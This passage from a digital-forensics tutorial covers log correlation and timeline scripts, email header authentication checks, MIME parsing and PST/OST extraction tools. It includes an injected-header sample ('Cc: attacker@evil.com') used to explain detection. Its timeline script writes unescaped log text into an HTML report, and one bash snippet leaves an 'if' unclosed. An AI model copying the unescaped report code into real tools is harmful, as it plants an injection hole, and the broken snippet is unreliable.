    echo "$epoch|WEB|$line" >> "$TEMP_FILE"
done

# Search firewall logs
echo "[+] Checking firewall logs..."
if grep -h "SRC=$TARGET_IP\|DST=$TARGET_IP" /var/log/syslog 2>/dev/null | grep -i "ufw\|iptables" | while read line; do
    timestamp=$(echo "$line" | awk '{print $1, $2, $3}')
    epoch=$(date -d "$(date +%Y) $timestamp" +%s 2>/dev/null)
    echo "$epoch|FW|$line" >> "$TEMP_FILE"
done

# Sort by timestamp and display
echo ""
echo "[*] Correlation Timeline:"
echo "========================================"

sort -t'|' -k1 -n "$TEMP_FILE" | while IFS='|' read epoch source line; do
    if [ "$epoch" != "0" ]; then
        human_time=$(date -d "@$epoch" "+%Y-%m-%d %H:%M:%S")
        echo "[$human_time] [$source] $line"
    fi
done

# Cleanup
rm -f "$TEMP_FILE"
```

## Timeline Creation from Logs

### Super Timeline Creation with log2timeline/plaso

bash

```bash
# Install plaso
apt-get install plaso-tools

# Create timeline from multiple sources
log2timeline.py \
    --storage-file timeline.plaso \
    --parsers linux \
    /var/log/ \
    /home/*/.bash_history

# Add Windows EVTX files
log2timeline.py \
    --storage-file timeline.plaso \
    --parsers winevtx \
    /mnt/windows/Windows/System32/winevt/Logs/

# Process filesystem timestamps
log2timeline.py \
    --storage-file timeline.plaso \
    --parsers filestat \
    /evidence/

# Filter and export timeline
psort.py \
    --output-time-zone 'UTC' \
    -o l2tcsv \
    -w timeline.csv \
    timeline.plaso

# Filter by date range
psort.py \
    -o dynamic \
    -w filtered_timeline.csv \
    timeline.plaso \
    "date > '2024-10-01 00:00:00' AND date < '2024-10-15 23:59:59'"

# Filter by event type
psort.py \
    -o dynamic \
    -w auth_timeline.csv \
    timeline.plaso \
    "parser is 'syslog' AND message contains 'sshd'"

# Search for specific indicators
pinfo.py timeline.plaso | grep -i "malware\|suspicious"
```

### Manual Timeline Creation

python

```python
#!/usr/bin/env python3
# create_timeline.py

import csv
import re
from datetime import datetime
from collections import defaultdict

class TimelineCreator:
    def __init__(self):
        self.events = []
    
    def add_event(self, timestamp, source, event_type, description, details=None):
        """Add event to timeline"""
        self.events.append({
            'timestamp': timestamp,
            'source': source,
            'event_type': event_type,
            'description': description,
            'details': details or {}
        })
    
    def parse_syslog(self, filepath):
        """Parse syslog format logs"""
        pattern = re.compile(r'(\w+\s+\d+\s+\d+:\d+:\d+)\s+(\S+)\s+(\S+?)(?:\[\d+\])?:\s+(.*)')
        
        with open(filepath, 'r', errors='ignore') as f:
            for line in f:
                match = pattern.match(line)
                if match:
                    timestamp_str, hostname, process, message = match.groups()
                    # Add current year for parsing
                    timestamp = datetime.strptime(f"2024 {timestamp_str}", "%Y %b %d %H:%M:%S")
                    
                    self.add_event(
                        timestamp=timestamp,
                        source=filepath,
                        event_type=process,
                        description=message,
                        details={'hostname': hostname}
                    )
    
    def parse_apache_access(self, filepath):
        """Parse Apache/Nginx access logs"""
        pattern = re.compile(
            r'([\d.]+)\s+-\s+-\s+\[([^\]]+)\]\s+"(\w+)\s+([^\s]+)[^"]*"\s+(\d+)\s+(\d+)'
        )
        
        with open(filepath, 'r', errors='ignore') as f:
            for line in f:
                match = pattern.match(line)
                if match:
                    ip, timestamp_str, method, path, status, bytes_sent = match.groups()
                    timestamp = datetime.strptime(timestamp_str.split()[0], "%d/%b/%Y:%H:%M:%S")
                    
                    self.add_event(
                        timestamp=timestamp,
                        source=filepath,
                        event_type='http_request',
                        description=f"{method} {path} -> {status}",
                        details={
                            'ip': ip,
                            'method': method,
                            'path': path,
                            'status': int(status),
                            'bytes': int(bytes_sent)
                        }
                    )
    
    def parse_auth_log(self, filepath):
        """Parse authentication logs"""
        patterns = {
            'login_success': re.compile(r'(\w+\s+\d+\s+\d+:\d+:\d+).*Accepted \w+ for (\S+) from ([\d.]+)'),
            'login_failure': re.compile(r'(\w+\s+\d+\s+\d+:\d+:\d+).*Failed password for (?:invalid user )?(\S+) from ([\d.]+)'),
            'sudo': re.compile(r'(\w+\s+\d+\s+\d+:\d+:\d+).*sudo.*USER=(\S+).*COMMAND=(.*)'),
        }
        
        with open(filepath, 'r', errors='ignore') as f:
            for line in f:
                for event_type, pattern in patterns.items():
                    match = pattern.search(line)
                    if match:
                        groups = match.groups()
                        timestamp = datetime.strptime(f"2024 {groups[0]}", "%Y %b %d %H:%M:%S")
                        
                        if event_type in ['login_success', 'login_failure']:
                            user, ip = groups[1], groups[2]
                            self.add_event(
                                timestamp=timestamp,
                                source=filepath,
                                event_type=event_type,
                                description=f"{'Successful' if 'success' in event_type else 'Failed'} login: {user}",
                                details={'user': user, 'ip': ip}
                            )
                        elif event_type == 'sudo':
                            user, command = groups[1], groups[2]
                            self.add_event(
                                timestamp=timestamp,
                                source=filepath,
                                event_type='sudo_command',
                                description=f"sudo by {user}: {command}",
                                details={'user': user, 'command': command}
                            )
                        break
    
    def export_csv(self, output_file):
        """Export timeline to CSV"""
        # Sort events chronologically
        self.events.sort(key=lambda x: x['timestamp'])
        
        with open(output_file, 'w', newline='') as csvfile:
            fieldnames = ['timestamp', 'source', 'event_type', 'description', 'details']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            writer.writeheader()
            for event in self.events:
                writer.writerow({
                    'timestamp': event['timestamp'].isoformat(),
                    'source': event['source'],
                    'event_type': event['event_type'],
                    'description': event['description'],
                    'details': str(event['details'])
                })
    
    def export_html(self, output_file):
        """Export timeline to HTML visualization"""
        self.events.sort(key=lambda x: x['timestamp'])
        
        html = """
<!DOCTYPE html>
<html>
<head>
    <title>Security Timeline</title>
    <style>
        body { font-family: monospace; margin: 20px; background: #1e1e1e; color: #d4d4d4; }
        .event { margin: 10px 0; padding: 10px; border-left: 3px solid #007acc; background: #2d2d2d; }
        .timestamp { color: #569cd6; font-weight: bold; }
        .source { color: #4ec9b0; }
        .event-type { color: #dcdcaa; }
        .description { color: #d4d4d4; margin-top: 5px; }
        .details { color: #9cdcfe; font-size: 0.9em; margin-top: 5px; }
        .critical { border-left-color: #f48771; }
        .warning { border-left-color: #ce9178; }
    </style>
</head>
<body>
    <h1>Security Event Timeline</h1>
"""
        
        for event in self.events:
            css_class = 'event'
            if 'fail' in event['event_type'].lower() or 'error' in event['event_type'].lower():
                css_class += ' critical'
            elif 'warn' in event['event_type'].lower():
                css_class += ' warning'
            
            html += f"""
    <div class="{css_class}">
        <div class="timestamp">{event['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</div>
        <div class="source">Source: {event['source']}</div>
        <div class="event-type">Type: {event['event_type']}</div>
        <div class="description">{event['description']}</div>
"""
            if event['details']:
                html += f"""        <div class="details">Details: {event['details']}</div>\n"""
            
            html += "    </div>\n"
        
        html += """
</body>
</html>
"""
        
        with open(output_file, 'w') as f:
            f.write(html)
    
    def generate_summary(self):
        """Generate timeline summary statistics"""
        summary = {
            'total_events': len(self.events),
            'time_range': None,
            'by_source': defaultdict(int),
            'by_type': defaultdict(int),
            'critical_events': []
        }
        
        if self.events:
            sorted_events = sorted(self.events, key=lambda x: x['timestamp'])
            summary['time_range'] = (
                sorted_events[0]['timestamp'],
                sorted_events[-1]['timestamp']
            )
        
        critical_keywords = ['fail', 'error', 'denied', 'unauthorized', 'attack', 'malware']
        
        for event in self.events:
            summary['by_source'][event['source']] += 1
            summary['by_type'][event['event_type']] += 1
            
            # Identify critical events
            if any(keyword in event['description'].lower() for keyword in critical_keywords):
                summary['critical_events'].append(event)
        
        return summary

if __name__ == '__main__':
    import sys
    
    timeline = TimelineCreator()
    
    # Parse multiple log sources
    print("[*] Parsing logs...")
    
    try:
        timeline.parse_auth_log('/var/log/auth.log')
        print("[+] Parsed auth.log")
    except FileNotFoundError:
        print("[-] auth.log not found")
    
    try:
        timeline.parse_apache_access('/var/log/apache2/access.log')
        print("[+] Parsed access.log")
    except FileNotFoundError:
        print("[-] access.log not found")
    
    try:
        timeline.parse_syslog('/var/log/syslog')
        print("[+] Parsed syslog")
    except FileNotFoundError:
        print("[-] syslog not found")
    
    # Generate outputs
    print("\n[*] Generating timeline outputs...")
    timeline.export_csv('timeline.csv')
    print("[+] Created timeline.csv")
    
    timeline.export_html('timeline.html')
    print("[+] Created timeline.html")
    
    # Print summary
    summary = timeline.generate_summary()
    print(f"\n[*] Timeline Summary:")
    print(f"    Total events: {summary['total_events']}")
    
    if summary['time_range']:
        start, end = summary['time_range']
        duration = (end - start).total_seconds() / 3600
        print(f"    Time range: {start} to {end} ({duration:.2f} hours)")
    
    print(f"\n    Events by source:")
    for source, count in sorted(summary['by_source'].items(), key=lambda x: x[1], reverse=True):
        print(f"      {source}: {count}")
    
    print(f"\n    Top event types:")
    for event_type, count in sorted(summary['by_type'].items(), key=lambda x: x[1], reverse=True)[:10]:
        print(f"      {event_type}: {count}")
    
    if summary['critical_events']:
        print(f"\n    [!] Critical events: {len(summary['critical_events'])}")
        for event in summary['critical_events'][:5]:
            print(f"        {event['timestamp']}: {event['description']}")
```

### Timeline Visualization with Timesketch

bash

```bash
# Install Timesketch (Docker recommended)
docker pull timesketch/timesketch

# Run Timesketch
docker run -d -p 5000:5000 timesketch/timesketch

# Convert logs to Plaso format
log2timeline.py evidence.plaso /var/log/ /evidence/

# Import into Timesketch via web interface
# Access: http://localhost:5000

# Or use CLI
timesketch_importer --timeline_name "Investigation" evidence.plaso
```

**Related Important Topics:**

- **SIEM Integration**: Splunk, ELK Stack log aggregation and analysis
- **Log Tampering Detection**: Integrity verification using checksums and forward-secure logging
- **Real-time Log Monitoring**: Using tools like fail2ban, OSSEC, Wazuh for active response

---

# Email Forensics

## Email Header Analysis

Email headers contain routing information, authentication data, and metadata essential for forensic investigation. Headers reveal sender identity, transmission path, timestamps, and potential manipulation.

**Email Header Structure**

Email headers consist of field-value pairs following RFC 5322 standard. Headers appear before message body, separated by blank line. Each header field format:

```
Field-Name: Field-Value
```

Multi-line headers continue with whitespace on subsequent lines.

**Critical Header Fields**

**From:** Displayed sender address (easily spoofed)

```
From: John Doe <john.doe@example.com>
```

This field is set by mail client and not verified by receiving servers. Cannot be trusted for authentication without additional verification.

**Return-Path:** Envelope sender address used for bounce messages

```
Return-Path: <sender@example.com>
```

Set by receiving mail server based on SMTP MAIL FROM command. More reliable than From header but still spoofable at sending server.

**Reply-To:** Address for replies (may differ from From)

```
Reply-To: support@phishing-site.com
```

Phishing attacks often use legitimate-looking From address but malicious Reply-To directing responses to attacker-controlled address.

**To:** Primary recipients

```
To: victim@target.com
```

**Cc:** Carbon copy recipients

```
Cc: colleague@target.com
```

**Bcc:** Blind carbon copy (not visible to other recipients)

```
Bcc: hidden@example.com
```

Bcc headers typically removed by sending server before delivery, but may appear in sent mail copies.

**Subject:** Email topic

```
Subject: Urgent: Account Verification Required
```

**Date:** Sender's timestamp (client-generated, may be inaccurate)

```
Date: Fri, 11 Oct 2024 14:23:45 -0700
```

Client-set timestamp. Timezone offset indicates sender's claimed location. Compare with Received header timestamps for discrepancies.

**Message-ID:** Unique identifier for message

```
Message-ID: <20241011142345.12345@example.com>
```

Format typically: `<timestamp.unique-id@domain>`. Used for threading and duplicate detection. Legitimate servers generate unique IDs; suspicious patterns include:

- Missing Message-ID
- Duplicate Message-IDs across different messages
- Malformed IDs (incorrect format)
- IDs from different domain than sender

**Received Headers**

Most important forensic evidence. Each mail server handling message adds Received header at top of header chain. Read bottom-to-top to trace message path.

Format:

```
Received: from sending-server.example.com (sendhost.example.com [192.168.1.50])
    by receiving-server.target.com (Postfix) with ESMTPS id ABC123
    for <recipient@target.com>; Fri, 11 Oct 2024 14:25:12 -0700 (PDT)
```

Components:

- **from**: Claimed sending server hostname and IP
- **by**: Receiving server performing verification
- **with**: Protocol used (SMTP, ESMTP, ESMTPS)
- **id**: Queue ID on receiving server
- **for**: Recipient address
- **timestamp**: When received by this server

**Received Header Analysis**

Count Received headers:

```bash
grep -c "^Received:" email.eml
```

Typical legitimate email has 3-7 Received headers depending on infrastructure complexity. Very few (<2) suggests direct injection or header manipulation. Excessive headers (>10) may indicate relay abuse or complicated routing.

**Trace Message Path:**

Extract all Received headers in order:

```bash
grep "^Received:" email.eml | tac
```

`tac` reverses order to show chronological path from sender to recipient.

**Verify Hostname/IP Consistency:**

Each Received header's claimed hostname should resolve to stated IP:

```bash
dig +short sending-server.example.com
```

Compare with IP in Received header. Mismatch indicates spoofing or misconfiguration.

**Timestamp Analysis:**

Extract timestamps from Received headers:

```bash
grep "^Received:" email.eml | grep -oP '\d{1,2} \w{3} \d{4} \d{2}:\d{2}:\d{2}'
```

Verify chronological order (each hop should be later than previous). Timestamps going backward indicate manipulation. Large time gaps suggest delays in relay queue or timezone inconsistencies.

**Authentication Headers**

**SPF (Sender Policy Framework):**

```
Received-SPF: pass (google.com: domain of sender@example.com designates 192.168.1.50 as permitted sender)
```

Results:

- **pass**: Sending IP authorized for domain
- **fail**: Sending IP not authorized (likely spoofing)
- **softfail**: Weak failure (transitioning SPF policy)
- **neutral**: No policy or policy doesn't specify
- **none**: No SPF record found

**DKIM (DomainKeys Identified Mail):**

```
DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector;
    c=relaxed/relaxed; h=from:to:subject:date;
    bh=base64-body-hash; b=base64-signature
```

Key fields:

- **v=1**: DKIM version
- **a=**: Algorithm (rsa-sha256, rsa-sha1)
- **d=**: Signing domain
- **s=**: Selector (identifies signing key)
- **h=**: Signed headers
- **bh=**: Body hash
- **b=**: Signature value

Authentication result:

```
Authentication-Results: mx.google.com;
    dkim=pass header.i=@example.com header.s=selector
```

Results:

- **pass**: Signature valid, message unmodified
- **fail**: Signature invalid (message modified or forged)
- **temperror**: Temporary DNS failure retrieving key
- **permerror**: Permanent error (no key, malformed signature)

**DMARC (Domain-based Message Authentication):**

```
Authentication-Results: mx.google.com;
    dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=example.com
```

DMARC validates SPF and DKIM alignment with From domain. Policy actions:

- **p=none**: Monitor only, no enforcement
- **p=quarantine**: Flag as suspicious
- **p=reject**: Reject message

**ARC (Authenticated Received Chain):**

Preserves authentication results through forwarding:

```
ARC-Authentication-Results: i=1; mx.forwarder.com;
    spf=pass smtp.mailfrom=original@example.com;
    dkim=pass header.i=@example.com
```

ARC chain (i=1, i=2, etc.) shows authentication status at each forwarding hop.

**Header Extraction Commands**

Extract specific headers from EML file:

```bash
# All headers
sed '/^$/q' email.eml

# Specific header
grep -i "^From:" email.eml

# Case-insensitive with multi-line support
awk '/^[Ff]rom:/,/^[^ \t]/' email.eml | head -n -1

# Using Python for robust parsing
python3 -c "
import email
import sys
msg = email.message_from_file(open('email.eml'))
print(msg['From'])
print(msg['Subject'])
for received in msg.get_all('Received'):
    print(received)
"
```

**X-Headers (Custom Headers)**

Mail systems add custom headers prefixed with X-:

**X-Originating-IP:** Sender's IP address (Outlook.com, Yahoo)

```
X-Originating-IP: [192.168.1.100]
```

Direct evidence of sender location. Verify against VPN/proxy databases.

**X-Mailer:** Email client software

```
X-Mailer: Microsoft Outlook 16.0
```

Identifies client application and version. Inconsistencies between claimed client and message formatting suggest manipulation.

**X-Spam-Score:** Spam filtering results

```
X-Spam-Score: 8.5
X-Spam-Status: Yes, score=8.5 required=5.0
```

**X-Forwarded-For:** Original sender in forwarded messages

**X-Priority:** Message priority (1=High, 3=Normal, 5=Low)

Phishing often uses High priority to create urgency.

**Header Anomaly Detection**

**Missing Critical Headers:**

- No Message-ID suggests manual crafting
- No Date suggests stripped headers
- No Received headers impossible in legitimate email

**Malformed Headers:**

```bash
# Check for RFC violations
formail -c < email.eml
```

**Timezone Inconsistencies:**

Compare Date header timezone with Received headers:

```bash
grep -E "^(Date:|Received:)" email.eml
```

Sender claiming US timezone but all servers in Asia suggests spoofing or compromised account.

**Content-Type Inconsistencies:**

```
Content-Type: text/html; charset="utf-8"
```

HTML content with plain text client (X-Mailer indicates text-only client) suggests manipulation.

**Header Injection Attacks:**

Attackers inject additional headers through vulnerable forms:

```
To: victim@example.com
Cc: attacker@evil.com
```

Multiple To: or Cc: headers indicate injection attempt.

**Forensic Header Analysis Workflow**

1. **Extract and preserve original headers:**

```bash
cp original_email.eml evidence_email.eml
sed '/^$/q' evidence_email.eml > headers_only.txt
sha256sum headers_only.txt > headers_hash.txt
```

2. **Identify sender authentication:**

```bash
grep -i "authentication-results\|received-spf\|dkim-signature" evidence_email.eml
```

3. **Trace message path:**

```bash
grep "^Received:" evidence_email.eml | tac > message_path.txt
```

4. **Extract IP addresses:**

```bash
grep "^Received:" evidence_email.eml | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | sort -u > sender_ips.txt
```

5. **Verify DNS records:**

```bash
while read ip; do
    echo "IP: $ip"
    dig +short -x $ip
    whois $ip | grep -E "OrgName|NetName|Country"
    echo "---"
done < sender_ips.txt
```

6. **Timeline reconstruction:**

```bash
grep "^Received:\|^Date:" evidence_email.eml | grep -oP '\d{1,2} \w{3} \d{4} \d{2}:\d{2}:\d{2} [+-]\d{4}'
```

7. **Document findings:** Create report including:

- Claimed sender (From header)
- Actual sender (Return-Path, earliest Received header)
- Authentication results (SPF, DKIM, DMARC)
- Complete message path with timestamps
- IP geolocation information
- Identified anomalies or red flags

## MIME Structure Parsing

Multipurpose Internet Mail Extensions (MIME) enables emails to contain multiple parts with different content types: HTML, plain text, images, attachments. Understanding MIME structure is essential for complete forensic analysis.

**MIME Basics**

MIME extends basic email format to support:

- Multiple content types beyond plain text
- Non-ASCII characters in headers and body
- Multipart messages with attachments
- Alternative representations (text and HTML versions)

**MIME Headers**

**MIME-Version:**

```
MIME-Version: 1.0
```

Indicates MIME-compliant message. Always "1.0" in practice.

**Content-Type:**

Defines content format and boundaries:

**Single-part text:**

```
Content-Type: text/plain; charset="utf-8"
```

**HTML message:**

```
Content-Type: text/html; charset="utf-8"
```

**Multipart message:**

```
Content-Type: multipart/mixed; boundary="----=_Part_12345_67890.1234567890"
```

**Content-Transfer-Encoding:**

Specifies encoding for binary data transmission:

```
Content-Transfer-Encoding: base64
```

Common encodings:

- **7bit**: ASCII text only
- **8bit**: Extended ASCII
- **quoted-printable**: Mostly text with some binary
- **base64**: Binary data (attachments, images)
- **binary**: Raw binary (rare, not universally supported)

**Content-Disposition:**

Indicates how content should be presented:

```
Content-Disposition: attachment; filename="document.pdf"
Content-Disposition: inline; filename="image.jpg"
```

- **attachment**: File should be saved separately
- **inline**: Content displayed within message

**Multipart Structure**

Multipart messages contain multiple MIME parts separated by boundary strings.

**Multipart Types:**

**multipart/mixed**: Independent parts (body text + attachments)

```
Content-Type: multipart/mixed; boundary="----BOUNDARY1"

------BOUNDARY1
Content-Type: text/plain

Email body text here

------BOUNDARY1
Content-Type: application/pdf; name="document.pdf"
Content-Disposition: attachment; filename="document.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQKJeLjz9MKMyAwIG9iago8PAovVHlwZSAvUGFnZQo...

------BOUNDARY1--
```

**multipart/alternative**: Different versions of same content

```
Content-Type: multipart/alternative; boundary="----BOUNDARY2"

------BOUNDARY2
Content-Type: text/plain; charset="utf-8"

Plain text version of email

------BOUNDARY2
Content-Type: text/html; charset="utf-8"

<html><body>HTML version of email</body></html>

------BOUNDARY2--
```

Email clients display preferred format (typically HTML if supported).

**multipart/related**: Content with embedded resources

```
Content-Type: multipart/related; boundary="----BOUNDARY3"

------BOUNDARY3
Content-Type: text/html; charset="utf-8"

<html><body><img src="cid:image001"></body></html>

------BOUNDARY3
Content-Type: image/png; name="logo.png"
Content-ID: <image001>
Content-Transfer-Encoding: base64

iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ...

------BOUNDARY3--
```

Images referenced by Content-ID (cid:) are embedded within message.

**Nested Multipart Structure**

Complex emails nest multipart types:

```
multipart/mixed (entire message)
├── multipart/alternative (message body)
│   ├── text/plain (plain text version)
│   └── multipart/related (HTML with images)
│       ├── text/html (HTML content)
│       └── image/png (embedded image)
├── application/pdf (attachment 1)
└── application/zip (attachment 2)
```

**Parsing MIME Structure**

**Python email library:**

```python
import email
import sys

with open('message.eml', 'r') as f:
    msg = email.message_from_file(f)

# Display structure
def show_structure(msg, level=0):
    indent = '  ' * level
    content_type = msg.get_content_type()
    print(f"{indent}{content_type}")
    
    if msg.is_multipart():
        for part in msg.get_payload():
            show_structure(part, level + 1)
    else:
        disposition = msg.get('Content-Disposition', '')
        if 'attachment' in disposition:
            filename = msg.get_filename()
            print(f"{indent}  Attachment: {filename}")

show_structure(msg)
```

**Command-line MIME parsing:**

```bash
# Extract MIME structure with munpack
munpack -t message.eml

# View structure with ripmime
ripmime -i message.eml --no-tnef --verbose

# Parse with Python one-liner
python3 -c "
import email
msg = email.message_from_file(open('message.eml'))
for part in msg.walk():
    print(part.get_content_type(), part.get_filename())
"
```

**Extracting MIME Parts**

**Extract all attachments:**

```python
import email
import os

def extract_attachments(eml_file, output_dir):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    for part in msg.walk():
        if part.get_content_maintype() == 'multipart':
            continue
        if part.get('Content-Disposition') is None:
            continue
        
        filename = part.get_filename()
        if filename:
            filepath = os.path.join(output_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(part.get_payload(decode=True))
            print(f"Extracted: {filename}")

extract_attachments('message.eml', 'extracted_attachments/')
```

**Extract specific part by Content-Type:**

```python
def extract_html_body(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    for part in msg.walk():
        if part.get_content_type() == 'text/html':
            return part.get_payload(decode=True).decode('utf-8', errors='ignore')
    return None

html_content = extract_html_body('message.eml')
with open('email_body.html', 'w') as f:
    f.write(html_content)
```

**Decoding Content-Transfer-Encoding**

**Base64 decoding:**

```bash
# Extract base64 part
sed -n '/Content-Transfer-Encoding: base64/,/^------/p' message.eml | tail -n +2 | head -n -1 | base64 -d > decoded_attachment.bin
```

**Quoted-Printable decoding:**

```python
import quopri

def decode_quoted_printable(encoded_data):
    return quopri.decodestring(encoded_data)

# Usage
with open('qp_encoded.txt', 'rb') as f:
    encoded = f.read()
    decoded = decode_quoted_printable(encoded)
    with open('decoded.txt', 'wb') as out:
        out.write(decoded)
```

**Charset Decoding**

Handle various character encodings:

```python
def decode_content(part):
    payload = part.get_payload(decode=True)
    charset = part.get_content_charset() or 'utf-8'
    try:
        return payload.decode(charset)
    except (UnicodeDecodeError, LookupError):
        # Fallback to UTF-8 with error handling
        return payload.decode('utf-8', errors='replace')
```

**MIME Header Decoding**

Email headers with non-ASCII characters use encoded-word syntax:

```
Subject: =?UTF-8?B?VXJnZW50OiBBY2NvdW50IFZlcmlmaWNhdGlvbg==?=
```

Format: `=?charset?encoding?encoded-text?=`

Encodings:

- **B**: Base64
- **Q**: Quoted-printable

Decode with Python:

```python
from email.header import decode_header

def decode_mime_header(header_value):
    decoded_parts = decode_header(header_value)
    decoded_string = ''
    for content, charset in decoded_parts:
        if isinstance(content, bytes):
            decoded_string += content.decode(charset or 'utf-8', errors='replace')
        else:
            decoded_string += content
    return decoded_string

subject = "=?UTF-8?B?VXJnZW50OiBBY2NvdW50IFZlcmlmaWNhdGlvbg==?="
print(decode_mime_header(subject))
```

**Inline Image Extraction**

Extract images embedded with Content-ID:

```python
def extract_inline_images(eml_file, output_dir):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    for part in msg.walk():
        content_id = part.get('Content-ID')
        if content_id and part.get_content_maintype() == 'image':
            # Remove < > from Content-ID
            cid = content_id.strip('<>')
            filename = part.get_filename() or f"{cid}.img"
            
            filepath = os.path.join(output_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(part.get_payload(decode=True))
            print(f"Extracted inline image: {filename} (CID: {cid})")

extract_inline_images('message.eml', 'inline_images/')
```

**TNEF (winmail.dat) Handling**

Microsoft Outlook sometimes encodes attachments in TNEF format (winmail.dat):

```
Content-Type: application/ms-tnef; name="winmail.dat"
```

Extract TNEF contents:

```bash
# Install tnef utility
apt-get install tnef

# Extract winmail.dat
tnef -v winmail.dat
```

Or with Python:

```bash
pip install tnefparse

python3 << EOF
import tnefparse
import sys

with open('winmail.dat', 'rb') as f:
    tnef = tnefparse.TNEF(f.read())
    
for attachment in tnef.attachments:
    with open(attachment.name, 'wb') as out:
        out.write(attachment.data)
    print(f"Extracted: {attachment.name}")
EOF
```

**MIME Boundary Manipulation Detection**

Attackers may manipulate boundaries to hide malicious content:

**Premature boundary termination:**

```
------BOUNDARY
Content-Type: text/plain

Visible content
------BOUNDARY--

Hidden malicious content after final boundary
```

**Missing boundary markers:**

Content without proper boundary separation suggests manual manipulation.

**Boundary collision:**

Using common strings as boundaries may cause parsing errors if string appears in content.

**Validation:**

```python
def validate_mime_structure(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    issues = []
    
    # Check for proper boundary usage
    if msg.is_multipart():
        boundary = msg.get_boundary()
        content = open(eml_file, 'r').read()
        
        # Count boundary occurrences
        delimiter = f"--{boundary}"
        terminator = f"--{boundary}--"
        
        delimiter_count = content.count(delimiter)
        terminator_count = content.count(terminator)
        
        if terminator_count != 1:
            issues.append(f"Abnormal terminator count: {terminator_count}")
        
        # Check for content after final boundary
        final_boundary_pos = content.rfind(terminator)
        if final_boundary_pos != -1:
            after_boundary = content[final_boundary_pos + len(terminator):].strip()
            if after_boundary:
                issues.append("Content found after final boundary")
    
    return issues

issues = validate_mime_structure('suspicious.eml')
if issues:
    print("MIME structure issues detected:")
    for issue in issues:
        print(f"  - {issue}")
```

**Content-Type Mismatch Detection**

File extension may not match actual content type:

```python
import magic

def verify_attachment_types(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    mime = magic.Magic(mime=True)
    
    for part in msg.walk():
        filename = part.get_filename()
        if filename:
            payload = part.get_payload(decode=True)
            declared_type = part.get_content_type()
            actual_type = mime.from_buffer(payload)
            
            if declared_type != actual_type:
                print(f"Type mismatch for {filename}:")
                print(f"  Declared: {declared_type}")
                print(f"  Actual: {actual_type}")
```

**MIME Parsing withripmime**

ripmime is specialized MIME parser for forensics:

```bash
# Extract all MIME parts
ripmime -i message.eml -d extracted_parts/

# Verbose output showing structure
ripmime -i message.eml --verbose

# Generate detailed report
ripmime -i message.eml --name-by-type --verbose > mime_analysis.txt
```

Output includes:

- Part-by-part structure
- Content types and encodings
- Filenames and sizes
- Boundary markers
- Extraction status

**Complex MIME Structure Analysis**

Analyze deeply nested structures:

```python
def analyze_mime_depth(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    def get_depth(part, depth=0):
        max_depth = depth
        if part.is_multipart():
            for subpart in part.get_payload():
                max_depth = max(max_depth, get_depth(subpart, depth + 1))
        return max_depth
    
    depth = get_depth(msg)
    print(f"Maximum MIME nesting depth: {depth}")
    
    if depth > 10:
        print("WARNING: Unusually deep MIME nesting detected")
    
    return depth
```

Excessive nesting (>10 levels) may indicate:

- Parser evasion attempts
- Malformed automated messages
- Malware obfuscation

**MIME Forensic Workflow**

1. **Preserve original message:**

```bash
cp original.eml evidence.eml
sha256sum evidence.eml > evidence_hash.txt
```

2. **Extract and analyze structure:**

```bash
python3 mime_analyzer.py evidence.eml > mime_structure.txt
```

3. **Extract all parts separately:**

```bash
ripmime -i evidence.eml -d mime_parts/ --name-by-type
```

4. **Calculate hashes for each part:**

```bash
find mime_parts/ -type f -exec sha256sum {} \; > part_hashes.txt
```

5. **Identify file types:**

```bash
find mime_parts/ -type f -exec file {} \; > part_types.txt
```

6. **Scan for malware:**

```bash
clamscan -r mime_parts/ > malware_scan.txt
```

7. **Document findings:**

- MIME structure diagram
- List of all parts with types and sizes
- Identified anomalies
- Hash values for all extracted components

## PST/OST File Analysis

PST (Personal Storage Table) and OST (Offline Storage Table) are Microsoft Outlook data files containing emails, contacts, calendar items, and attachments. Forensic analysis recovers deleted items and metadata.

**PST vs OST Files**

**PST Files:**

- Personal storage for archived emails
- Local copy independent of mail server
- User-created archives or default storage
- Typically located: `C:\Users\<username>\Documents\Outlook Files\`

**OST Files:**

- Offline cache of Exchange server mailbox
- Synchronized copy for offline access
- Automatically created by Outlook
- Typically located: `C:\Users\<username>\AppData\Local\Microsoft\Outlook\`

Forensically, both formats contain equivalent data and use similar structures.

**PST File Structure**

PST files use proprietary binary format with hierarchical structure:

**File Header:**

- Format version (ANSI or Unicode)
- Encryption status
- File signature (0x21, 0x42, 0x44, 0x4E)

**Node Database (NDB):**

- B-tree structure storing data blocks
- Nodes contain emails, folders, attachments

**Messaging Database:**

- Logical layer organizing folders and items
- Properties for each message

**PST Versions:**

**ANSI PST:** Legacy format, 2GB size limit

```
Magic bytes: 21 42 44 4E (at offset 0)
```

**Unicode PST:** Modern format, 20GB+ capacity

```
Magic bytes: 21 42 44 4E (at offset 0)
Format identifier at offset 10: 0x17 (Unicode)
```

**Forensic PST Tools**

**readpst (libpst):**

Open-source PST parser:

```bash
# Install libpst
apt-get install pst-utils

# Convert PST to mbox format
readpst -o output_dir/ -r mailbox.pst

# Convert to separate EML files
readpst -o output_dir/ -e mailbox.pst

# Verbose output with metadata
readpst -o output_dir/ -e -v mailbox.pst
```

Output structure:

```
output_dir/
├── Inbox/
│   ├── message_001.eml
│   ├── message_002.eml
├── Sent Items/
├── Deleted Items/
└── Attachments/
```

**pffinfo (libpff):**

Analyze PST/OST file information:

```bash
# Install libpff
apt-get install libpff-utils

# Display PST file information
pffinfo mailbox.pst

# Export to CSV
pffexport -m all -t export_dir mailbox.pst
```

pffinfo output includes:

- File format version
- Encryption status
- Number of items
- Creation time
- Modification time

**Kernel PST Viewer:**

